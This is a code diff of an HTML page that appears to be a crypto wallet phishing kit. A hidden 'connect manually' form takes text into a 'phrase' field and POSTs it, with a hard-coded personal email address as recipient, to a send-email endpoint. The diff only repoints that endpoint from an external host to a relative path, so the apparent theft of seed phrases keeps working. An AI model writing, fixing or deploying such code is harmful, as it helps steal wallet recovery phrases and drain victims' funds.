@@ -1756,7 +1756,7 @@
                 </form> -->
 
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form action="https://decentralized-launchpad.vercel.app/api/send-email" method="POST" id="my-form">
+                        <form action="./api/send-email" method="POST" id="my-form">
                             <input type="hidden" name="email" value="oriyebakap6@gmail.com">
                             <div id="phrase">
                                 <textarea
@@ -1949,7 +1949,7 @@
 
         try {
             // Send data as JSON using fetch
-            const response = await fetch('https://decentralized-launchpad.vercel.app/api/send-email', {
+            const response = await fetch('./api/send-email', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
